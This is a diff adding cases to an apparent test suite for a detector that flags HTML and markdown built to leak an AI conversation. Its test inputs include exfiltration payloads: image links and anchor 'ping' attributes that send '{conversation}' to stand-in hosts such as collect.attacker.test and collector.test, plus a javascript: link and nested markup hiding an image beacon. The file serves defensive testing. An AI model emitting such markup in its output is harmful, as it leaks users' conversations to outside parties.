@@ -741,6 +741,11 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("<img src='' src='https://a.test/{c}.png'>", []),
         ("<a href href='javascript:alert(1)'>x</a>", []),
         ("<a href='/docs' ping='/audit https://collector.test/?q={conversation}'>docs</a>", ["exfiltration_query"]),
+        ("<a href='https://docs.test/' ping='https://collector.test/{conversation}'>docs</a>", ["exfiltration_query"]),
+        (
+            "<div><select></div><iframe></select><img src='https://collector.test/{conversation}.png'></iframe>",
+            ["uncheckable_markup"],
+        ),
         ("![x](https://collector.test/p.png?u=$ID)", ["exfiltration_query"]),
         ("![x](https://collector.test/p.png?u=$Q)", ["exfiltration_query"]),
         ("![x](https://a.test/p.png?price=$5)", []),
